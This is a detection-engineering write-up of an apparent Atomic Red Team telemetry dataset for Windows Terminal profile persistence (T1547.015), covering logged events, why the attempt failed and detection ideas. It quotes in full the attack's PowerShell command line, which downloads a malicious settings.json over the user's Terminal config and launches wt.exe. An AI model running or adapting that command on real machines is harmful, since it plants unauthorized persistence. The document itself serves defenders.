# T1547.015-1: Login Items — Persistence by Modifying Windows Terminal Profile

## Technique Context

T1547.015 (Login Items) covers mechanisms where an application or script is configured to
execute automatically when a user session starts. On Windows, this extends to application-specific
startup hooks such as the Windows Terminal profile. This test attempts to replace the Windows
Terminal `settings.json` with a malicious version fetched from the ART GitHub repository that
adds a `startupActions` entry pointing to a payload. When Windows Terminal launches on login,
it processes this startup configuration and executes the specified command.

The test operates in three steps: back up the existing `settings.json` to `%TEMP%`, download the
malicious replacement via `Invoke-WebRequest`, and launch `wt.exe` to trigger execution.

## What This Dataset Contains

**Sysmon (51 events):** EID 7 (ImageLoad), EID 11 (FileCreated), EID 17 (PipeCreated),
EID 1 (ProcessCreate), EID 3 (NetworkConnect), EID 10 (ProcessAccess), and EID 22 (DnsQuery).
Key events:

- `whoami.exe` spawned by PowerShell (EID 1, rule `T1033`)
- Child `powershell.exe` process with the full attack script command line (EID 1)
- Three EID 3 (NetworkConnect) events from `MsMpEng.exe` — Defender scanning outbound connections
- EID 22 (DnsQuery) for `raw.githubusercontent.com` and `github.com` from `<unknown process>` —
  these are the DNS lookups triggered by `Invoke-WebRequest` attempting to fetch the malicious
  `settings.json`

**Security (13 events):** EID 4688/4689 and EID 4703. Process creates: `whoami.exe` and the
child `powershell.exe` with command line:
`& {mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"; wt.exe}`

No `wt.exe` process creation appears in the security log.

**PowerShell (56 events):** EID 4103 and 4104 capture the full script, the `Move-Item` failure,
and the `Invoke-WebRequest` terminating error. EID 4100 records the error message:
`"Cannot find path 'C:\Windows\system32\config\systemprofile\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json' because it does not exist."` — this test ran as `NT AUTHORITY\SYSTEM`, which does not have Windows Terminal installed in its profile.

## What This Dataset Does Not Contain (and Why)

**No `settings.json` file modification** — the test failed before the file was written. Windows
Terminal is not present in the SYSTEM account's profile (`C:\Windows\system32\config\systemprofile`).
The `Move-Item` step threw a `DirectoryNotFoundException` and `Invoke-WebRequest` subsequently
failed, so neither the backup nor the malicious replacement was written.

**No `wt.exe` execution** — because the file write failed, `wt.exe` was never invoked and no
Terminal startup behavior was triggered.

**No actual payload execution** — the persistence mechanism was never established.

**Successful file-based detection artifacts absent** — there are no file-write events
(Sysmon EID 11) for the Terminal profile path. The file creation event present in the dataset is
the PowerShell startup profile data file, not the target settings.json.

## Assessment

This dataset captures a **failed persistence attempt** due to execution context: the test ran as
`NT AUTHORITY\SYSTEM`, which lacks a Windows Terminal installation. The attack's intent is fully
documented in the PowerShell logs (EID 4103/4104 with the complete script, target path, and
download URL), and the DNS lookups for GitHub show the network phase was attempted. The failure
mode itself is forensically useful — it demonstrates what the attack looks like when it cannot
complete, including the specific error path that would differ from a successful execution.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** `powershell.exe` command line referencing
  `Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json` as a target for
  `Move-Item` or `Invoke-WebRequest` — the package path is distinctive
- **PowerShell EID 4103/4104:** Script block and module logging showing `Invoke-WebRequest`
  targeting a URL to overwrite `settings.json` in the Windows Terminal LocalState directory
- **Sysmon EID 22 / EID 3:** DNS query for `raw.githubusercontent.com` or `github.com` from a
  PowerShell process running as SYSTEM — unusual in normal operation
- **File monitoring:** Any write to
  `*\Microsoft.WindowsTerminal_*\LocalState\settings.json` by a process other than Windows
  Terminal itself warrants investigation
- **PowerShell EID 4100:** Error messages referencing Terminal profile paths indicate a failed
  attempt that may succeed under a different execution context
